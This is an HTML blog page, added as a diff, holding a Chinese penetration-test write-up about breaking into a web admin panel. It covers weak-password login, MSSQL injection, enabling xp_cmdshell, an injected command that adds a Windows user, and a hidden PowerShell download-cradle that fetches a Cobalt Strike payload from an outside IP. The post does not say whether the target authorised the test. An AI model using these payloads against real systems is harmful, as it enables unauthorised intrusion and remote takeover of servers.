@@ -1,0 +1,539 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="TTT">
+  <meta name="keywords" content="">
+  
+  <title>一次简单的web到上线 - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="一次简单的web到上线">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-29 08:36" pubdate>
+        2021年8月29日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      435 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      5
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一次简单的web到上线</h1>
+            
+            <div class="markdown-body">
+              <h2 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h2><blockquote>
+<p>首先来到目标的后台</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\0.png" srcset="/img/loading.gif" lazyload alt="0"></p>
+<blockquote>
+<p>看见这种很简陋 就感觉有洞<br>试了一下弱口令 靠 直接进了</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\0.1.png" srcset="/img/loading.gif" lazyload alt="0.1"></p>
+<blockquote>
+<p>然后通过改包  也是可以登录的</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>改包进来然后修改账户 发现这账号有点离谱</p>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<blockquote>
+<p>然后就开始在后台找找能不能拿shell 的地方<br>导入的地方可以上传文件</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<blockquote>
+<p>但是只能上传excel文件</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<blockquote>
+<p>尝试改文件后缀 结果失败了 然后继续找其他突破口</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<blockquote>
+<p>这里有个查询的地方 然后开启抓包 因为这种查询的地方很有可能是带有参数查询的 就可能含有注入</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<blockquote>
+<p>好家伙 这注入不久来了嘛 mssql的</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<blockquote>
+<p>直接dba的权限<br>尝试cmdshell</p>
+<blockquote>
+<p><em>通过下面sql语句开启</em><br><em>xpcmd sp_configure ‘show advanced options’,</em><br><em>sp_configure ‘xp_cmdshell’,1</em></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>尝试ping dnslog</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
+<blockquote>
+<p>是出网的 直接尝试添加 账户 上3389</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
+<blockquote>
+<p><em>selstate=0&amp;numState1_5=&amp;Remarks2=&amp;number=1’; exec master ..xp_cmdshell ‘net user test1 test1 /add’ — &amp;numState=%E5%85%A8%E9%83%A8&amp;page=1&amp;rows=500</em></p>
+<p>扫端口发现3389是开的</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
+<blockquote>
+<p>然后直接连 发现连不上 添加到用户组</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
+<blockquote>
+<p>还是连不上 就先不管 直接上cs</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
+<blockquote>
+<p><em>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘</em><a target="_blank" rel="noopener" href="http://45.32.92.74:88/aa*%E2%80%98))%E2%80%9D">http://45.32.92.74:88/aa*‘))”</a>*</p>
+<p>因为存在引号这些 所以 直接编个码</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
+<blockquote>
+<p>直接复制到注入的地方</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
+<blockquote>
+<p>然后GO 坐等上线</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\19.png" srcset="/img/loading.gif" lazyload alt="19"></p>
+<blockquote>
+<p>好家伙 直接来了  杀软都没有</p>
+</blockquote>
+<p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/blog\victoryBlog\source_posts\一次简单的web到上线\20.png" srcset="/img/loading.gif" lazyload alt="20"></p>
+<blockquote>
+<p>然后查看ip发现是内网 那刚开始3389连不上 应该就是这个情况 对方在内网 所以没连上</p>
+</blockquote>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote>
+<p>因为这cs服务器没用了 所以就没打码了 师傅们轻点喷 如果我有说错的地方,师傅们 轻点喷</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">windows编程控件的使用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/">
+                        <span class="hidden-mobile">windows对话框资源</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
